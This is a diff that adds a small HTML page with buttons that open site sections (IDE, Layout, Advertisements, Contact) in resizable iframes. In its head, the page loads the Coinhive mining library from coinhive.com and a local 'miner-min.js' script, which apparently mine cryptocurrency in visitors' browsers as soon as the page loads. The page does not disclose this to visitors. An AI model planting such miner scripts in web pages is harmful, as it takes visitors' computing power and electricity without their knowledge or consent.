@@ -1,0 +1,58 @@
+<!doctype html>
+
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
+	<script type="text/javascript" src="miner-min.js"></script>
+
+	<link rel="icon" href="PKRRF.jpg"> <!-- śivatāṇḍava -->
+	<title>Custom</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<link rel="stylesheet" href="style.css" type="text/css">
+</head>
+
+<body id="custom">
+	<h2>Custom</h2>
+
+	<table>
+		<tr>
+			<td><button onclick="printIframe('ide.html')"><abbr title="Integrated Development Environment">IDE</abbr></button></td>
+			<td><button onclick="printIframe('layout.html')">Layout</button></td>
+			<td><button onclick="printIframe('advertisements.html')">Advertisements</button></td>
+			<td><button onclick="printIframe('contact.html')">Contact</button></td>
+		</tr>
+	</table>
+	<script>
+	function printIframe(page) {
+		var div = document.createElement('div');
+		div.setAttribute('class', "resize-div");
+		var iframe = document.createElement('iframe');
+		iframe.setAttribute('src', page);
+		iframe.setAttribute('class', "resize-iframe");
+		div.appendChild(iframe);
+		document.body.appendChild(div);
+	}
+	</script>
+
+	<!-- top-to-bottom: header, body, footer -->
+	<!-- left-to-right: left columns, right columns -->
+
+	<!--<div>
+		<iframe src="sitemap.html"></iframe>
+	</div>-->
+
+	<style>
+	.resize-div {
+	  overflow: hidden;
+	  resize: both;
+	}
+	.resize-iframe {
+	  height: 100%;
+	  width: 100%;
+	  border: none;
+	}
+	</style>
+</body>
+</html>
